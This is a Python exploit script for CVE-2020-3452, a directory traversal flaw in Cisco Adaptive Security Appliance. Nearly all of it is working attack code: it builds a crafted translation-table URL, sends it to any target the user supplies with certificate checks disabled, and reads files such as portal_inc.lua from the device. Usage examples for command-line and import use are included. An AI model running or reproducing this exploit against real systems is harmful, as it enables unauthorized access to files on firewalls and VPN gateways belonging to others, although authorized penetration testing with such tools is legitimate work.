#!/usr/bin/env python3
# Cisco Adaptive Security Appliance Directory Traversal (CVE-2020-3452)
# Ref: https://twitter.com/RapidSafeguard/status/1287365482031403009

from argparse import ArgumentParser
from requests import Session
from logging import warning, error
from yaml import SafeLoader, load as yload

class QBExploit:
	def __init__(self, **kwargs):
		self.__dict__.update(kwargs)
		self.exploit = '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/{0}&default-language&lang=../'

	def run_exploit(self):
		#Needed arguments
		if all(x in self.__dict__ for x in ["target","verify","headers", "file", "exploit"]):
			if self.headers != None:
				self.headers = yload(self.headers,Loader=SafeLoader)
			if self.file == None:
				self.exploit = self.exploit.format('logo.gif')
			else:
				self.exploit = self.exploit.format(self.file)
			if self.headers == None:
				self.headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
	
			if self.target == None:
				warning('[!] No target')
				return -1
			try:
				warning('[X] Executing {}'.format(self.target+self.exploit))
				r_session = Session()
				req = r_session.post(self.target+self.exploit,headers=self.headers,timeout=5,verify=False)
				print(req.request.body)
				#extra steps here
				if self.verify:
					self.verify_exploit(req)
				return True
			except Exception as e:
				if hasattr(e, 'message'):
					error('[!] Error: {}'.format(e.message))
				else:
					error('[!] Error: {}'.format(e))
		else:
			error('[!] Error in exploit arguments')
		return False
		
	def verify_exploit(self,req):
		if req.status_code == 200:
			warning('[X] verified')
			return True
		return False

if __name__ == '__main__':

	print('''QeeqBox falcon (CVE-2020-3452 [passed])

------ How to Use (As Script) ------

CVE-2020-3452.py --target 'url' --file 'portal_inc.lua' --headers '{"User-Agent":"Testing"}' --verify 'true'

target      [Required]
file        [Not required, default is logo.gif]
headers     [Not required, default is '{"User-Agent":"Mozilla/5.0..."}']
verify      [Not required, default is false]

Examples:
CVE-2020-3452.py --target http://1.1.1.1
CVE-2020-3452.py --target https://1.1.1.1 --file portal_inc.lua

------ How to Use (As Object)  ------

from CVE-2020-3452 import QBExploit
qbxploit = QBExploit(target='https://127.0.0.1',file=None,headers=None,verify='true')
qbxploit.run_exploit()
''')
	warning('[X] Starting')
	parser = ArgumentParser()
	parser.add_argument('--target', type=str)
	parser.add_argument('--file',type=str,required=False)
	parser.add_argument('--headers',type=str,required=False)
	parser.add_argument('--verify',type=str,required=False, default=False)
	args = parser.parse_args()
	qbxploit = QBExploit(**vars(args))
	qbxploit.run_exploit()
	warning('[X] Done')
